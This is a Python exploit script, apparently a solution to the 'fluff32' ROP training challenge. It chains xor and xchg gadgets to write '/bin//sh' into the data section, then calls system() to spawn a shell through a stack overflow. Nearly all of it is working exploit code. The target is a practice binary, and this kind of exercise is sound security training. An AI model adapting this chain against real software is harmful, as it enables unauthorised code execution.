#!/usr/bin/python
import struct
import os

def p32(addr):
	return struct.pack("<I",addr)

garbage = "A"*44

data_section = 0x0804a028

system = p32(0x08048430)

#ropper --file ./fluff32
#0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
#0x080483e1: pop ebx; ret;
#0x0804868b: pop ebp; mov edx, 0xdefaced0; ret;
#0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
#0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
#0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;

xchg_edx_ecx_pop_ebp_mov_edx_0xdefaced0 = p32(0x08048689)
#0x080483e1: pop ebx; ret;
pop_ebx = p32(0x080483e1)
pop_ebp_mov_edx_0xdefaced0 = p32(0x0804868b)
xor_edx_ebx_pop_ebp_mov_edi_0xdeadbabe = p32(0x0804867b)
xor_edx_edx_pop_esi_mov_ebp_0xcafebabe = p32(0x08048671)
mov_dword_ptr_ecx_edx_pop_ebp_pop_ebx_xor_byte_ptr_ecx_bl = p32(0x08048693)

exploit = garbage
exploit += xor_edx_edx_pop_esi_mov_ebp_0xcafebabe #edx is zeroed
exploit += "pppp" #pop esi
exploit += pop_ebx
exploit += p32(data_section) #pop ebx
exploit += xor_edx_ebx_pop_ebp_mov_edi_0xdeadbabe #edx now contains data_section addr
exploit += "pppp" #pop ebp
exploit += xchg_edx_ecx_pop_ebp_mov_edx_0xdefaced0 #ecx now contains data_section addr
exploit += "pppp" #pop ebp
exploit += xor_edx_edx_pop_esi_mov_ebp_0xcafebabe #edx is zeroed
exploit += "pppp" #pop esi
exploit += pop_ebx
exploit += "/bin" #pop ebx
exploit += xor_edx_ebx_pop_ebp_mov_edi_0xdeadbabe #edx now contains "/bin" string
exploit += "pppp" #pop ebp
exploit += mov_dword_ptr_ecx_edx_pop_ebp_pop_ebx_xor_byte_ptr_ecx_bl #now the "/bin" string is in the data_section
exploit += "pppp" #pop ebp
exploit += p32(0) #pop ebx, 0 because bl will be xored with the "/bin" string
exploit += xor_edx_edx_pop_esi_mov_ebp_0xcafebabe #edx is zeroed
exploit += "pppp" #pop esi
exploit += pop_ebx
exploit += p32(data_section+4) #ebx now contains data_section addr
exploit += xor_edx_ebx_pop_ebp_mov_edi_0xdeadbabe #edx now contains data_section+4 addr
exploit += "pppp" #pop ebp
exploit += xchg_edx_ecx_pop_ebp_mov_edx_0xdefaced0 #ecx now contains data_section+4 addr
exploit += "pppp" #pop ebp
exploit += xor_edx_edx_pop_esi_mov_ebp_0xcafebabe #edx is zeroed
exploit += "pppp" #pop esi
exploit += pop_ebx
exploit += "//sh" #ebx now contains the "//sh" string
exploit += xor_edx_ebx_pop_ebp_mov_edi_0xdeadbabe #edx now contains "//sh" string
exploit += "pppp" #pop ebp
exploit += mov_dword_ptr_ecx_edx_pop_ebp_pop_ebx_xor_byte_ptr_ecx_bl #now the "//sh" string is in the data_section+4
exploit += "pppp" #pop ebp
exploit += p32(0) #pop ebx, 0 because bl will be xored with the "//sh" string
exploit += system
exploit += "pppp"
exploit += p32(data_section)

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("((cat simple_exploit.txt); cat -)|./fluff32")
